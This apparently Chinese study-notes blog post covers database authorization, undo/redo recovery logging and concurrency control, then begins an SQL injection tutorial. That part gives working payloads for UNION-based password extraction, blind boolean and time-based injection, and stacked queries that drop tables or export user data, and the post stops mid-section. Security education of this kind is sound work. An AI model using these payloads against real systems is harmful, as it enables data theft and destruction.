<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION CheckAccess(userId INT, resource VARCHAR(20))</span><br><span class="line">RETURNS BOOLEAN</span><br><span class="line">BEGIN</span><br><span class="line">  DECLARE hasAccess BOOLEAN;</span><br><span class="line">  SELECT COUNT(*) INTO hasAccess </span><br><span class="line">  FROM Permissions </span><br><span class="line">  WHERE user_id = userId AND resource = resource;</span><br><span class="line">  RETURN hasAccess;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="安全与用户授权"><a href="#安全与用户授权" class="headerlink" title="安全与用户授权"></a>安全与用户授权</h3><h4 id="1-权限类型与数据库对象"><a href="#1-权限类型与数据库对象" class="headerlink" title="1. 权限类型与数据库对象"></a>1. <strong>权限类型与数据库对象</strong></h4><p>SQL定义了9种详细权限，针对不同数据库对象（如表、视图、触发器、存储过程等）：</p>
<ul>
<li><strong>SELECT</strong>：允许查询数据（可指定属性列）。</li>
<li><strong>INSERT</strong>：允许插入新元组（可指定属性列）。</li>
<li><strong>DELETE</strong>：允许删除元组。</li>
<li><strong>UPDATE</strong>：允许修改数据（可指定属性列）。</li>
<li><strong>REFERENCE</strong>：允许外键引用该表的列。</li>
<li><strong>USAGE</strong>：允许使用模式中的非关系对象（如域、序列）。</li>
<li><strong>TRIGGER</strong>：允许在表上创建触发器。</li>
<li><strong>EXECUTE</strong>：允许执行存储过程或函数。</li>
<li><strong>UNDER</strong>：允许基于现有类型创建子类型。</li>
</ul>
<p><strong>示例</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span> <span class="keyword">ON</span> Employees <span class="keyword">TO</span> user1 <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br></pre></td></tr></table></figure></div>

<p>此语句允许 <code>user1</code> 查询和插入数据到 <code>Employees</code> 表，并可将权限授予他人。</p>
<h4 id="2-属主（Owner）与授权ID"><a href="#2-属主（Owner）与授权ID" class="headerlink" title="2. 属主（Owner）与授权ID"></a>2. <strong>属主（Owner）与授权ID</strong></h4><ul>
<li><strong>属主</strong>：创建数据库对象（如表、模式）的用户自动成为属主，拥有所有权限。</li>
<li><strong>授权ID</strong>：代表用户身份，包括：<ul>
<li><strong>用户授权ID</strong>（如登录名）。</li>
<li><strong>PUBLIC</strong>：所有用户。</li>
<li><strong>当前授权ID</strong>：由会话或模块的 <code>AUTHORIZATION</code> 子句决定。</li>
</ul>
</li>
</ul>
<p><strong>关键场景</strong>：</p>
<ul>
<li><p>创建模式时，通过<code>AUTHORIZATION</code>指定属主：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SCHEMA Sales <span class="keyword">AUTHORIZATION</span> alice;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>连接数据库时指定会话授权ID：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CONNECT</span> <span class="keyword">TO</span> db1 <span class="keyword">USER</span> bob IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="3-权限检查流程"><a href="#3-权限检查流程" class="headerlink" title="3. 权限检查流程"></a>3. <strong>权限检查流程</strong></h4><p>用户执行操作时，需满足以下条件之一：</p>
<ol>
<li><strong>当前授权ID是属主</strong>。</li>
<li><strong>属主直接授予权限</strong>（包括通过 <code>PUBLIC</code>）。</li>
<li><strong>通过模块执行</strong>：模块属主拥有所需权限。</li>
<li><strong>公开模块与会话授权ID</strong>：若模块为公开，会话授权ID需有权限。</li>
</ol>
<p><strong>示例</strong>：<br>用户 <code>bob</code> 执行存储过程 <code>proc1</code>（属主为 <code>alice</code>），若 <code>alice</code> 对表 <code>Orders</code> 有 <code>SELECT</code> 权限，则 <code>bob</code> 可执行 <code>proc1</code> 查询 <code>Orders</code>，无需直接授权。</p>
<h4 id="4-授权与收权机制"><a href="#4-授权与收权机制" class="headerlink" title="4. 授权与收权机制"></a>4. <strong>授权与收权机制</strong></h4><ul>
<li><p><strong>GRANT</strong>：授予权限，可选 <code>WITH GRANT OPTION</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">UPDATE</span>(salary) <span class="keyword">ON</span> Employees <span class="keyword">TO</span> user2 <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>user2</code> 可更新 <code>salary</code> 列，并可将权限授予他人。</li>
</ul>
</li>
<li><p><strong>REVOKE</strong>：收回权限，需指定 <code>CASCADE</code> 或 <code>RESTRICT</code>。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> Employees <span class="keyword">FROM</span> user1 CASCADE;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>CASCADE</code>：级联收回所有通过 <code>user1</code> 授予的权限。</li>
<li><code>RESTRICT</code>：若存在依赖权限，则拒绝收权。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-授权图（Privilege-Graph）"><a href="#5-授权图（Privilege-Graph）" class="headerlink" title="5. 授权图（Privilege Graph）"></a>5. <strong>授权图（Privilege Graph）</strong></h4><ul>
<li><strong>节点</strong>：表示用户及其权限状态（如 <code>AP*</code> 表示用户A拥有权限P及授权选项）。</li>
<li><strong>边</strong>：表示权限授予关系（如A授予B权限P）。</li>
<li><strong>属主标记</strong>：<code>P**</code> 表示权限的原始属主。</li>
</ul>
<p><strong>授权图规则</strong>：</p>
<ul>
<li>用户拥有权限的条件：从属主节点到该用户的权限节点存在有效路径。</li>
<li>收权操作会删除相关边，并检查节点是否仍与属主连通，否则删除节点。</li>
</ul>
<p><strong>示例</strong>：</p>
<ol>
<li>属主 <code>X</code> 授予 <code>A</code> 权限P（带授权选项），形成边 <code>XP** → AP*</code>。</li>
<li><code>A</code> 授予 <code>B</code> 权限P，形成边 <code>AP* → BP</code>。</li>
<li>若 <code>X</code> 收回 <code>A</code> 的权限（使用 <code>CASCADE</code>），则删除 <code>XP** → AP*</code> 和 <code>AP* → BP</code>，导致 <code>A</code> 和 <code>B</code> 的权限节点均被移除。</li>
</ol>
<h4 id="6-视图与访问控制"><a href="#6-视图与访问控制" class="headerlink" title="6. 视图与访问控制"></a>6. <strong>视图与访问控制</strong></h4><p>视图可限制用户访问特定数据，增强安全性：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Sales_Dept_View <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> name, salary <span class="keyword">FROM</span> Employees <span class="keyword">WHERE</span> dept <span class="operator">=</span> <span class="string">&#x27;Sales&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> Sales_Dept_View <span class="keyword">TO</span> sales_team;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>用户 <code>sales_team</code> 仅能查看销售部门数据，无需访问完整 <code>Employees</code> 表。</li>
</ul>
<h4 id="7-权限传递与安全策略"><a href="#7-权限传递与安全策略" class="headerlink" title="7. 权限传递与安全策略"></a>7. <strong>权限传递与安全策略</strong></h4><ul>
<li><strong>最小权限原则</strong>：仅授予必要权限，避免过度授权。</li>
<li><strong>审计</strong>：监控权限授予与使用，防止滥用。</li>
<li><strong>依赖管理</strong>：使用 <code>RESTRICT</code> 防止意外级联收权破坏依赖关系。</li>
</ul>
<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p><strong>undo&#x2F;redo日志结合了undo和redo两种日志机制，能够灵活处理事务的恢复。以下是其恢复过程的详细步骤及关键问题分析：</strong></p>
<h4 id="1-日志记录结构"><a href="#1-日志记录结构" class="headerlink" title="1. 日志记录结构"></a><strong>1. 日志记录结构</strong></h4><p>undo&#x2F;redo日志的记录格式为<code>&lt;T, X, v, w&gt;</code>，其中：</p>
<ul>
<li><strong>T</strong>：事务标识</li>
<li><strong>X</strong>：数据库元素（如字段、页、元组）</li>
<li><strong>v</strong>：修改前的旧值（用于undo）</li>
<li><strong>w</strong>：修改后的新值（用于redo）</li>
</ul>
<p><strong>规则UR1</strong>：事务修改数据库元素X前，对应的日志记录必须写入磁盘（WAL原则）。<br>​<strong>​规则UR2​</strong>​：一旦日志中出现<code>&lt;COMMIT T&gt;</code>，必须立即刷新到磁盘，禁止推迟提交。</p>
<hr>
<h4 id="2-恢复阶段"><a href="#2-恢复阶段" class="headerlink" title="2. 恢复阶段"></a><strong>2. 恢复阶段</strong></h4><p>恢复过程分为两个阶段：</p>
<ol>
<li><strong>Redo阶段</strong>：从前往后扫描日志，重做所有已提交事务的修改。</li>
<li><strong>Undo阶段</strong>：从后往前扫描日志，撤销所有未提交事务的修改。</li>
</ol>
<hr>
<h5 id="步骤1：确定事务状态"><a href="#步骤1：确定事务状态" class="headerlink" title="步骤1：确定事务状态"></a><strong>步骤1：确定事务状态</strong></h5><ul>
<li><strong>已提交事务</strong>：日志中存在<code>&lt;COMMIT T&gt;</code>记录。</li>
<li><strong>未提交事务</strong>：日志中存在<code>&lt;START T&gt;</code>但无<code>&lt;COMMIT T&gt;</code>或<code>&lt;ABORT T&gt;</code>记录。</li>
</ul>
<hr>
<h5 id="步骤2：Redo阶段（重做已提交事务）"><a href="#步骤2：Redo阶段（重做已提交事务）" class="headerlink" title="步骤2：Redo阶段（重做已提交事务）"></a><strong>步骤2：Redo阶段（重做已提交事务）</strong></h5><ul>
<li><p>操作：从日志起始位置开始扫描，对每个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;T, X, v, w&gt;</span><br></pre></td></tr></table></figure></div>

<p>记录：</p>
<ul>
<li>如果事务T已提交，将数据库元素X的值更新为w（新值）。</li>
<li><strong>注意</strong>：即使X当前的值已经是w，仍需执行此操作（幂等性保证）。</li>
</ul>
</li>
<li><p><strong>目的</strong>：确保所有已提交事务的修改持久化到磁盘，即使实际数据写入因故障未完成。</p>
</li>
</ul>
<hr>
<h5 id="步骤3：Undo阶段（撤销未提交事务）"><a href="#步骤3：Undo阶段（撤销未提交事务）" class="headerlink" title="步骤3：Undo阶段（撤销未提交事务）"></a><strong>步骤3：Undo阶段（撤销未提交事务）</strong></h5><ul>
<li><p>操作：从日志末尾开始逆向扫描，对每个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;T, X, v, w&gt;</span><br></pre></td></tr></table></figure></div>

<p>记录：</p>
<ul>
<li>如果事务T未提交，将数据库元素X的值恢复为v（旧值）。</li>
</ul>
</li>
<li><p><strong>目的</strong>：消除未完成事务对数据库的影响，保持一致性。</p>
</li>
</ul>
<hr>
<h4 id="3-关键问题与解决方案"><a href="#3-关键问题与解决方案" class="headerlink" title="3. 关键问题与解决方案"></a><strong>3. 关键问题与解决方案</strong></h4><h5 id="问题1：推迟提交导致COMMIT记录丢失"><a href="#问题1：推迟提交导致COMMIT记录丢失" class="headerlink" title="问题1：推迟提交导致COMMIT记录丢失"></a><strong>问题1：推迟提交导致COMMIT记录丢失</strong></h5><ul>
<li><strong>场景</strong>：事务T已完成，但<code>&lt;COMMIT T&gt;</code>未刷新到磁盘时发生故障，恢复时认为T未提交。</li>
<li><strong>解决</strong>：规则UR2强制<code>&lt;COMMIT T&gt;</code>一旦写入日志必须立即刷新，确保提交事务的持久性。</li>
</ul>
<h5 id="问题2：检查点优化"><a href="#问题2：检查点优化" class="headerlink" title="问题2：检查点优化"></a><strong>问题2：检查点优化</strong></h5><ul>
<li><strong>检查点作用</strong>：标记一个时间点，此前所有事务已提交或终止，缩小恢复范围。</li>
<li>实现：<ol>
<li>暂停接受新事务。</li>
<li>等待当前活跃事务完成（提交或回滚）。</li>
<li>刷新日志和缓冲区到磁盘。</li>
<li>写入<code>&lt;CKPT&gt;</code>记录，继续接受新事务。</li>
</ol>
</li>
<li><strong>恢复时</strong>：只需处理最近检查点之后的日志，提升效率。</li>
</ul>
<hr>
<h4 id="4-恢复示例"><a href="#4-恢复示例" class="headerlink" title="4. 恢复示例"></a><strong>4. 恢复示例</strong></h4><p>假设日志片段如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;START T1&gt;</span><br><span class="line">&lt;T1, A, 5, 10&gt;</span><br><span class="line">&lt;START T2&gt;</span><br><span class="line">&lt;T2, B, 3, 6&gt;</span><br><span class="line">&lt;COMMIT T1&gt;</span><br><span class="line">&lt;T2, C, 2, 4&gt;</span><br><span class="line">&lt;CKPT&gt;</span><br><span class="line">&lt;START T3&gt;</span><br><span class="line">&lt;T3, D, 7, 14&gt;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>恢复过程：<ol>
<li><strong>确定事务状态</strong>：T1已提交，T2未提交（无COMMIT），T3未提交（在CKPT后）。</li>
<li><strong>Redo阶段</strong>：重做T1的<code>A=10</code>。</li>
<li><strong>Undo阶段</strong>：撤销T2的<code>B=3</code>和<code>C=2</code>，撤销T3的<code>D=7</code>。</li>
</ol>
</li>
</ul>
<h3 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h3><h4 id="一、并发执行方式"><a href="#一、并发执行方式" class="headerlink" title="一、并发执行方式"></a>一、并发执行方式</h4><ol>
<li><strong>串行执行</strong>：<ul>
<li>每个事务顺序执行，前一个完成后才开始下一个。</li>
<li><strong>缺点</strong>：资源利用率低，无法发挥数据库共享特性。</li>
</ul>
</li>
<li><strong>交叉并发</strong>：<ul>
<li>单处理机上，事务操作轮流执行（如T1读→T2写→T1写）。</li>
<li><strong>优点</strong>：减少空闲时间，提高效率。</li>
</ul>
</li>
<li><strong>同时并发</strong>：<ul>
<li>多处理机并行执行事务，真正实现物理并行。</li>
</ul>
</li>
</ol>
<h4 id="二、为什么需要并发控制？"><a href="#二、为什么需要并发控制？" class="headerlink" title="二、为什么需要并发控制？"></a>二、为什么需要并发控制？</h4><ul>
<li><strong>问题场景</strong>：多个事务同时读写同一数据可能导致：<ul>
<li><strong>丢失更新</strong>：两个写操作覆盖彼此结果。</li>
<li><strong>脏读</strong>：读取未提交的中间数据。</li>
<li><strong>不可重复读</strong>：同一事务两次读结果不同。</li>
</ul>
</li>
<li><strong>目标</strong>：通过调度保证事务的隔离性和一致性，使并发执行结果与某串行执行等价。</li>
</ul>
<h4 id="三、可串行化调度"><a href="#三、可串行化调度" class="headerlink" title="三、可串行化调度"></a>三、可串行化调度</h4><ul>
<li><strong>串行调度</strong>：事务严格按顺序执行，结果正确但效率低。</li>
<li><strong>可串行化调度</strong>：调度结果等价于某一串行调度。<ul>
<li><strong>冲突可串行化</strong>：通过交换非冲突操作可转换为串行调度。</li>
<li><strong>冲突定义</strong>：两个操作涉及同一数据项且至少有一个是写操作。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>：</p>
<ul>
<li>事务T1：W(Y), W(X)</li>
<li>事务T2：W(Y), W(X)</li>
<li>调度L1（串行）：W1(Y)→W1(X)→W2(Y)→W2(X)</li>
<li>调度L2：W1(Y)→W2(Y)→W2(X)→W1(X)<ul>
<li>L2不可冲突可串行化（因W2(Y)在W1(Y)后，导致Y最终由T2写入），但结果与T2→T1串行执行相同，故仍为可串行化（非冲突可串行化）。</li>
</ul>
</li>
</ul>
<h4 id="四、冲突可串行性检测：优先图"><a href="#四、冲突可串行性检测：优先图" class="headerlink" title="四、冲突可串行性检测：优先图"></a>四、冲突可串行性检测：优先图</h4><ol>
<li><strong>构建优先图</strong>：<ul>
<li>节点：每个事务。</li>
<li>边：若事务Ti的操作先于Tj且冲突，则添加边Ti→Tj。</li>
</ul>
</li>
<li><strong>判断环的存在</strong>：<ul>
<li>若优先图无环，则为冲突可串行化；否则不可。</li>
</ul>
</li>
</ol>
<p><strong>示例</strong>：</p>
<ul>
<li>调度：r1(X); r2(Y); w1(X); w2(Y)</li>
<li>优先图：无边（无冲突），故冲突可串行化。</li>
</ul>
<h4 id="五、锁机制实现可串行化"><a href="#五、锁机制实现可串行化" class="headerlink" title="五、锁机制实现可串行化"></a>五、锁机制实现可串行化</h4><ol>
<li><strong>基本锁类型</strong>：<ul>
<li><strong>共享锁（S锁）</strong>：允许多事务读同一数据。</li>
<li><strong>排他锁（X锁）</strong>：仅允许一个事务读写数据。</li>
</ul>
</li>
<li><strong>两阶段锁协议（2PL）</strong>：<ul>
<li><strong>扩展阶段</strong>：事务仅可加锁，不可解锁。</li>
<li><strong>收缩阶段</strong>：事务仅可解锁，不可加锁。</li>
<li><strong>保证冲突可串行化</strong>：通过锁的互斥性强制事务操作顺序。</li>
</ul>
</li>
</ol>
<p><strong>锁相容矩阵</strong>：</p>
<table>
<thead>
<tr>
<th align="center">当前持有锁</th>
<th align="center">请求S锁</th>
<th align="center">请求X锁</th>
</tr>
</thead>
<tbody><tr>
<td align="center">S锁</td>
<td align="center">✓</td>
<td align="center">✕</td>
</tr>
<tr>
<td align="center">X锁</td>
<td align="center">✕</td>
<td align="center">✕</td>
</tr>
</tbody></table>
<ol>
<li><strong>锁升级机制</strong>：<ul>
<li><strong>更新锁（U锁）</strong>：初始为读权限，可升级为X锁。</li>
<li>相容性：U锁与S锁兼容，但与U&#x2F;X锁不兼容。</li>
</ul>
</li>
</ol>
<h4 id="六、死锁处理"><a href="#六、死锁处理" class="headerlink" title="六、死锁处理"></a>六、死锁处理</h4><ol>
<li><strong>预防策略</strong>：<ul>
<li><strong>一次封锁法</strong>：事务启动时锁定所有需访问的数据（降低并发度）。</li>
<li><strong>顺序封锁法</strong>：按固定顺序加锁（如按主键排序）。</li>
</ul>
</li>
<li><strong>诊断与解除</strong>：<ul>
<li><strong>超时法</strong>：事务等待超时后回滚。</li>
<li><strong>等待图法</strong>：检测事务等待环，选择代价最小的事务回滚。</li>
</ul>
</li>
</ol>
<p><strong>示例</strong>：</p>
<ul>
<li>T1持有A锁请求B锁，T2持有B锁请求A锁→检测到环，回滚T1或T2。</li>
</ul>
<h4 id="七、多粒度锁与幻读问题"><a href="#七、多粒度锁与幻读问题" class="headerlink" title="七、多粒度锁与幻读问题"></a>七、多粒度锁与幻读问题</h4><ul>
<li><strong>多粒度锁</strong>：允许对数据项、页、表等不同粒度加锁。</li>
<li>幻读：事务插入&#x2F;删除导致范围查询结果不一致。<ul>
<li><strong>解决</strong>：通过间隙锁（Gap Lock）锁定索引范围，阻止插入。</li>
</ul>
</li>
</ul>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>前面谈了那么多数据库的具体内容，但没有涉及到SQL注入的内容，貌似有点本末倒置<del>（或许也不是）</del>，所以接下来该了解一下SQL注入的原理与技巧了</p>
<h2 id="SQL注入的本质与原理"><a href="#SQL注入的本质与原理" class="headerlink" title="SQL注入的本质与原理"></a>SQL注入的本质与原理</h2><h3 id="漏洞根源：字符串拼接陷阱"><a href="#漏洞根源：字符串拼接陷阱" class="headerlink" title="漏洞根源：字符串拼接陷阱"></a>漏洞根源：字符串拼接陷阱</h3><p>SQL注入的根本原因是<strong>将用户输入直接拼接到SQL语句中</strong>。当开发者使用字符串拼接方式构造SQL查询时，攻击者可通过精心构造的输入改变原SQL语义。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + inputUser + <span class="string">&quot;&#x27; AND password = &#x27;&quot;</span> + inputPass + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="SQL注入攻击技术详解"><a href="#SQL注入攻击技术详解" class="headerlink" title="SQL注入攻击技术详解"></a>SQL注入攻击技术详解</h2><h3 id="1-基础注入手法"><a href="#1-基础注入手法" class="headerlink" title="1. 基础注入手法"></a>1. 基础注入手法</h3><h3 id="一、联合注入-Union-Based-Injection"><a href="#一、联合注入-Union-Based-Injection" class="headerlink" title="一、联合注入 (Union-Based Injection)"></a><strong>一、联合注入 (Union-Based Injection)</strong></h3><p><strong>原理</strong>：<br>利用<code>UNION SELECT</code>合并恶意查询结果到原始查询结果集中，通过页面回显直接窃取数据。<br><strong>攻击流程</strong>：</p>
<ol>
<li><p><strong>探测字段数</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> n<span class="comment">--   -- 逐步增加n直至报错（如n=5报错，则字段数为4）</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--  -- 用NULL占位测试字段数</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>确定回显位</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="string">&#x27;test1&#x27;</span>,<span class="string">&#x27;test2&#x27;</span>,<span class="number">4</span><span class="comment">--  -- 在页面中查找&#x27;test1&#x27;/&#x27;test2&#x27;出现位置</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>窃取数据</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,username,password,<span class="number">4</span> <span class="keyword">FROM</span> users<span class="comment">--</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>关键技巧</strong>：</p>
<ul>
<li><p>使用<code>-1</code>或无效ID使原始查询为空，确保只显示恶意结果</p>
</li>
<li><p>用<code>CONCAT()</code>合并字段（如<code>CONCAT(user,0x3a,passwd)</code>）</p>
</li>
<li><p>利用<code>information_schema</code>获取表&#x2F;列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,table_name,column_name,<span class="number">4</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database()<span class="comment">--</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<hr>
<h3 id="二、盲注-Blind-Injection"><a href="#二、盲注-Blind-Injection" class="headerlink" title="二、盲注 (Blind Injection)"></a><strong>二、盲注 (Blind Injection)</strong></h3><p><strong>适用场景</strong>：页面无显性错误回显，但可通过间接方式推断信息。</p>
<h4 id="1-布尔盲注-Boolean-Based"><a href="#1-布尔盲注-Boolean-Based" class="headerlink" title="1. 布尔盲注 (Boolean-Based)"></a>1. <strong>布尔盲注 (Boolean-Based)</strong></h4><p><strong>原理</strong>：根据页面内容真&#x2F;假状态差异推断数据。<br><strong>攻击流程</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(password,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span><span class="comment">--  -- 观察页面变化</span></span><br><span class="line"><span class="keyword">AND</span> (ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> @<span class="variable">@version</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">80</span><span class="comment">--   -- 二分法加速猜测</span></span><br></pre></td></tr></table></figure></div>

<p><strong>自动化工具</strong>：</p>
<ul>
<li>SQLMap的<code>--technique=B</code>参数</li>
<li>手动脚本循环猜测字符（ASCII值32-126）</li>
</ul>
<h4 id="2-时间盲注-Time-Based"><a href="#2-时间盲注-Time-Based" class="headerlink" title="2. 时间盲注 (Time-Based)"></a>2. <strong>时间盲注 (Time-Based)</strong></h4><p><strong>原理</strong>：通过延时函数构造条件触发响应延迟。<br><strong>典型Payload</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>

<p><strong>数据库差异</strong>：</p>
<table>
<thead>
<tr>
<th align="left">数据库</th>
<th align="left">延时函数</th>
</tr>
</thead>
<tbody><tr>
<td align="left">MySQL</td>
<td align="left"><code>SLEEP(5)</code>, <code>BENCHMARK(1000000,MD5(1))</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>pg_sleep(5)</code></td>
</tr>
<tr>
<td align="left">MSSQL</td>
<td align="left"><code>WAITFOR DELAY &#39;0:0:5&#39;</code></td>
</tr>
<tr>
<td align="left">Oracle</td>
<td align="left"><code>dbms_pipe.receive_message(&#39;a&#39;,5)</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="三、堆叠注入-Stacked-Queries-Injection"><a href="#三、堆叠注入-Stacked-Queries-Injection" class="headerlink" title="三、堆叠注入 (Stacked Queries Injection)"></a><strong>三、堆叠注入 (Stacked Queries Injection)</strong></h3><p><strong>原理</strong>：利用分号<code>;</code>一次性执行多条SQL语句。<br><strong>关键限制</strong>：</p>
<ul>
<li>需数据库驱动支持多语句执行（如PHP+MySQL默认<strong>不支持</strong>，但MSSQL&#x2F;PostgreSQL通常支持）</li>
<li>适用于非查询场景（增删改、文件读写）</li>
</ul>
<p><strong>典型攻击</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; DROP TABLE users; --   -- 删表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>; <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> hack(cmd text); <span class="comment">--  -- 建表窃取数据</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; COPY users TO &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>stolen.txt<span class="string">&#x27;; --  -- PostgreSQL文件导出</span></span><br></pre></td></tr></table></figure></div>

<p><strong>实战组合</strong>：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; INSERT INTO logs(data) VALUES((SELECT @@version)); --   -- 将数据写入可读表</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="四、报错注入-Error-Based-Injection"><a href="#四、报错注入-Error-Based-Injection" class="headerlink" title="四、报错注入 (Error-Based Injection)"></a><strong>四、报错注入 (Error-Based Injection)</strong></h3><p><strong>原理</strong>：故意触发数据库报错，使错误信息中包含敏感数据。</p>
<h4 id="主流技术实现："><a href="#主流技术实现：" class="headerlink" title="主流技术实现："></a>主流技术实现：</h4><ol>
<li><p><strong>十字符报错（MySQL 5.x）</strong></p>
